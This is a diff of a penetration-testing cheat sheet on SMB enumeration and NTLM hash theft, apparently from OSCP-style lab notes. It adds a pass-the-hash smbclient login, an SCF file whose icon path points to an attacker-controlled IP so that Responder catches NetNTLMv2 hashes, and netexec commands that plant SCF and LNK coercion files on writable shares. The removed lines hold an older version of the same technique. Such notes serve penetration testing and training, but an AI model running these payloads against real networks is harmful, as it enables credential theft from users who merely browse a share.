@@ -41,6 +41,11 @@ nbtscan
 # Try always as first command if we can enum shares
 nxc smb $IP -u $USER -p $PASS -M spider_plus
 
+############## smbclient
+└─$ smbclient.py -hashes :$NTHASH dom.com/user@IP                                                                                                                                                                             
+Type help for list of commands                                                                                                                                               
+# help
+
 # get SMB version
 https://github.com/rewardone/OSCPRepo/blob/master/scripts/recon_enum/smbver.sh
 smbver.sh 10.11.1.0 445
@@ -156,9 +161,34 @@ lookupsid.py example.local/anonymous@<target-ip> 20000 -no-pass
 lookupsid.py test.local/john:password123@10.10.10.1
 ```
 
-NTLM Stealing / URI attacks
+## NTLM Stealing / URI attacks
 
-```
+[#coerce-with-files](../../post-exploitation/windows/ad/exploitation.md#coerce-with-files "mention")
+
+{% code overflow="wrap" fullWidth="true" %}
+```bash
+https://swisskyrepo.github.io/InternalAllTheThings/active-directory/internal-shares/#write-permission
+
+If there is any interaction/authentication and we can upload files -> place .scf file
+https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
+https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf
+https://github.com/xct/hashgrab
+
+
+################### SCF / LNK files
+# Drop the following @something.scf file inside a share and start listening with Responder : responder -wrf --lm -v -I eth0
+[Shell]
+Command=2
+IconFile=\\10.10.10.10\Share\test.ico
+[Taskbar]
+Command=ToggleDesktop
+
+# Using netexec:
+netexec smb 10.10.10.10 -u username -p password -M scuffy -o NAME=WORK SERVER=IP_RESPONDER #scf
+netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER #lnk
+netexec smb 10.10.10.10 -u username -p password -M slinky -o NAME=WORK SERVER=IP_RESPONDER CLEANUP
+
+
 https://github.com/Greenwolf/ntlm_theft
 
 # -g all: Generate all files.
@@ -178,34 +208,6 @@ IconIndex=1
 
 # Another option
 IconFile=\\$ATTACKING_IP\%USERNAME%.icon
-```
-
-### .SCF file (Windows)
-
-{% hint style="info" %}
-If there is any interaction/authentication and we can upload files -> place .scf file
-
-[https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)
-
-[https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.scf)
-
-[https://github.com/xct/hashgrab](https://github.com/xct/hashgrab)
-{% endhint %}
-
-{% code overflow="wrap" %}
-```bash
-https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/
-# File syntax below
-[Shell]
-Command=2
-IconFile=\\X.X.X.X\share\setenso.ico
-[Taskbar]
-Command=ToggleDesktop
-# Upload the file to SMB shared folder
-smb: \> put file.scf
-# Then host SMB server on our attacking machine
-smbserver.py share . -smb2support
-# As soon as any user accesses that shared folder on Windows, it will try to load our icon and we will catch its NetNTLMv2 hash
 ```
 {% endcode %}
 
